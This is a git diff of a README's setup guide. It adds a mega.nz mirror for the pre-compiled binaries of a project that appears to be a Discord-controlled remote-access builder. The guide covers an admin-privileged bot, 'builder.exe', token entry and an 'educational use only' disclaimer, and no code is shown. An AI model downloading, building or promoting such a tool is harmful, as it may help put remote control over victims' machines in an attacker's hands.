@@ -13,7 +13,7 @@ This tool is for educational use only, the author will not be held responsible f
 This project was made by "LexOnTop" , "cure.him" on discord.
 
 ## **Setup Guide:**
-Download the pre-complied binary's here (https://anonfiles.com/lc6eldy7z7/Release_rar)
+Download the pre-complied binary's here (https://anonfiles.com/lc6eldy7z7/Release_rar , https://mega.nz/file/UaFDULQS#Lf5AYpz6w49NYpTtZ8-2bNkHldbizs8w9SCM2VB8N7s)
 
 You will first need to register a bot with the Discord developer portal and then add the bot to the Discord server that you want to use to control the bot (make sure the bot has administrator privileges in the Discord server).
 Once the bot is created open "builder.exe" and paste the token in, and paste the guild ID of where you invited the bot
